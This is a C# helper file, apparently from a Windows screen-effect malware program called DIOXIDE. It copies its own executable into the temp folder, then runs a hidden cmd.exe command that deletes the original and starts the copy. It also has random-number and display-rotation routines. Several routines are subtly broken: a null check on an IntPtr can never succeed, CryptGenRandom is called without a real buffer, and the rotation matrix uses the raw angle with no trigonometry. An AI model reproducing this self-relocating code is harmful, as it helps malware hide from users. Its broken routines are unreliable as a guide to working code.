using System;
using System.IO;
using System.Windows.Forms;
using System.Diagnostics;
using System.Threading;
using System.Runtime.InteropServices;
using System.Media;
using static DIOXIDE.Win32API;

namespace DIOXIDE
{
    public static class Functions
    {
        public static string TempPath = Path.GetTempPath();
        public static string exePath = Application.ExecutablePath;
        public static void DioxideEXECacheCreate()
        {
            File.Create(TempPath + "Dioxide.");
            return;
        }
        public static void DioxideEXECopy()
        {
            File.Copy(exePath, TempPath + "Dioxide.exe", true);
            return;
        }
        public static void DeleteDioxideEXE()
        {
            ProcessStartInfo del = new ProcessStartInfo();
            del.FileName = "cmd.exe";
            del.Arguments = "/k del Dioxide.exe && Start %Temp%\\Dioxide.exe && Exit";
            del.WorkingDirectory = AppDomain.CurrentDomain.BaseDirectory;
            del.WindowStyle = ProcessWindowStyle.Hidden;
            del.CreateNoWindow = true;
            Process.Start(del);
        }

        public static void DeleteDioxideEXECache()
        {
            File.Delete(TempPath + "Dioxide.");
        }
        public static void ProcessStart(ThreadStart thread)
        {
            new Thread(new ThreadStart(thread)).Start();
        }
        static IntPtr prov;
        static int xs;
        public static int random()
        {
            if (prov == null)
            {
                if (!CryptAcquireContext(ref prov, null, null, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
                {
                    ExitProcess(1);
                }
            }

            int @out = 0;
            CryptGenRandom(prov, (uint)Marshal.SizeOf(@out), (byte)@out);
            return @out & 0x7fffffff;
        }
        public static void SeedXorshift32(IntPtr dwSeed)
        {
            xs = (int)dwSeed;
        }

        public static IntPtr Xorshift32()
        {
            xs ^= xs << 13;
            xs ^= xs >> 17;
            xs ^= xs << 5;
            return (IntPtr)xs;
        }
        public static int RotateDC(IntPtr hdc, int Angle, POINT ptCenter)
        {
            int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
            XFORM xform;
            if (Angle != 0)
            {
                double fangle = (double)Angle / 180 * 3.1415926;
                xform.eM11 = (float)(fangle);
                xform.eM12 = (float)(fangle);
                xform.eM21 = (float)(fangle);
                xform.eM22 = (float)(fangle);
                xform.eDx = (float)(ptCenter.x - (fangle) * ptCenter.x + (fangle) * ptCenter.y);
                xform.eDy = (float)(ptCenter.y - (fangle) * ptCenter.y - (fangle) * ptCenter.x);
                SetWorldTransform(hdc, ref xform);
            }
            return nGraphicsMode;
        }
    }
}
